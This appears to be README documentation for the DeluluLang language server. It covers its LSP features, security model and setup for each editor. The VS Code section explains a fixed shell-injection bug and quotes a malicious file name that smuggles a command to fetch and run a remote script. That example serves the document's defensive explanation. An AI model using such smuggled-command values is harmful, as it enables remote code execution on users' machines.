# DeluluLang in your editor — one server, every surface

DeluluLang ships **one** language server: `delulu lsp` (LSP 3.17 over stdio). There are no
editor-specific server features, by rule (Constitution §8.4) — VS Code, Zed, Neovim, Helix,
JetBrains-via-LSP, and agentic IDEs (Antigravity et al.) all consume the same server and
get the same answers, because the answers are the compiler's.

## The three-line generic config

Any LSP-capable editor or agent IDE needs exactly this:

```
command:   delulu lsp
languages: delulu   (files: *.delulu)
transport: stdio
```

## What the server gives you

- **Diagnostics that ARE the compiler's** — same codes, spans, messages, and typed
  repairs as `delulu check --json`. Nothing is re-derived, nothing drifts.
- **Code actions from typed repairs** — an authority-widening repair is ⚠-titled and
  never preferred; `authority_widening`/`requires_human` ride in the action's `data`
  so agent harnesses can refuse them by policy.
- **Hover** — type, effect row, and (on a function name) the full signature plus its
  transitively computed authority.
- **The authority lens** — inlay hints show the inferred row on unannotated lambdas.
- **Completion** — the declarations in scope (a function carries its signature *and* its
  authority row, so you see what it can do before you call it), then the keywords.
  **Inside an effect row `! { … }` only effects are offered**, because nothing else is
  legal there and a suggestion that cannot compile is worse than no suggestion. Names
  from the file you are in sort above names from other open files. Every list comes from
  the compiler's own — keywords from the morph table, effects from the checker's core
  set — so the completion list cannot drift from the language.
- **Definition / references** for module-level names across the whole project —
  including files you have never opened. When several open files declare the same name,
  **definition resolves to the one you are in**, and otherwise to the first by URI —
  the same question always gets the same answer, in this session and the next.
- **Rename** for module-level names, **across the documents you have open**. A local
  rename is refused rather than guessed (resolving it needs shadow-aware scoping the
  server does not have), and a rename that would leave the name behind in unopened
  files is refused too — naming those files so you can open them. The reference walk is
  an approximation: it matches a qualified path's final segment, so an unrelated record
  method of the same name is included. Across files you have open that is a diff you can
  read and correct; across a project you have not opened it is silent corruption. So the
  server reads the whole project and writes only what you can see.
- **Semantic tokens** with dedicated kinds for effects, reference capabilities,
  capability types, and secrets.
- **Code lenses** on `fn main` (`▶ run`, `authority: {…}`) and every `test` block (`▶ run test`,
  which runs *that* test by name — it used to run the whole file).
- **`delulu.authority`** (workspace/executeCommand) — the §10.5 authority report as
  JSON over the wire; agent harnesses call this instead of shelling out.
- **Signature help** — while writing a call, the callee's parameters *and its
  authority row*, with the argument you are on highlighted. The label is sliced from
  the declaring file's own source, so you see the signature exactly as its author wrote
  it and no renderer can drift from the language. Actor behaviours get it too.
- **Workspace symbols** — every module-level declaration in the project, including in
  files you have never opened. The server indexes `*.delulu` under the workspace folders
  (skipping `target/`, `.git/` and friends), **parsing rather than type-checking** them,
  and validates that index against file modification times, so it does not go stale when
  the editor forgets to say a file changed. An open buffer always wins over its copy on
  disk — what you are looking at may not be saved. With no workspace folder, only open
  documents are searched, and nothing is read from disk.
- **Incremental sync** (`textDocumentSync: 2`) — an edit sends the range it touched
  rather than the whole file, and the document is checked once per edit rather than
  once per question asked about it. A client that prefers to resend the whole text is
  still honoured, so nothing needs configuring either way.

## What the server can NOT do — by construction

The LSP is analysis-only: it never runs code, never loads plugins, and holds no broker
connection or lease. A compromised workspace cannot use it as an effector. Its
availability is not a security property (spec §11).

## Per-editor notes

- **VS Code:** the extension lives in `editors/vscode/` (LSP client + TextMate grammar). Build and
  install it with:

  ```
  cd editors/vscode
  npm install
  npm run package     # esbuild bundle -> delulu-lang.vsix
  npm run verify      # refuses a .vsix that would fail to activate
  code --install-extension delulu-lang.vsix
  ```

  It requires `delulu` on your `PATH`; set `delulu.serverPath` if it is elsewhere.

  **It is bundled into one file on purpose.** Shipping the dependency tree instead produced a `.vsix`
  that packaged cleanly and would have thrown `Cannot find module` on activation: `npm install` put 8
  packages in `node_modules` and `vsce` shipped only the one named in `dependencies`, so three
  transitive requires travelled nowhere. `npm run verify` is what catches that — it unpacks the built
  archive and checks every `require` in every shipped file resolves, because a green *package* step
  says nothing about whether the thing inside runs.

  **Commands run with an argument vector, never a shell string.** The lenses previously built
  `` `${serverPath} run ${fsPath}` `` and handed it to the user's shell, so a file named
  `x;curl evil.sh|sh.delulu` executed on click and any path with a space ran the wrong command.
  `crates/delulu/tests/editor_contract.rs` fails the build if that shape returns, and if the three
  lists — commands the server emits, commands the client registers, commands the manifest declares —
  ever disagree. They had disagreed since Stage 8: `delulu.authority` was emitted by the server and
  registered by nobody, so clicking that lens raised *"command not found"* for the life of the feature.
- **Zed / Helix / Neovim (lspconfig) / Kate / Emacs (eglot):** point the editor's LSP
  config at `delulu lsp` for `*.delulu` — the three-line config above is all of it.
- **JetBrains:** via the native LSP support (2023.2+) or the LSP4IJ plugin; same command.
- **Agent IDEs / harnesses:** spawn `delulu lsp`, speak stdio; call `delulu.authority`
  for the report. `delulu` never prompts on machine channels (invariant 40) — the
  first-run picker cannot appear under `lsp`.
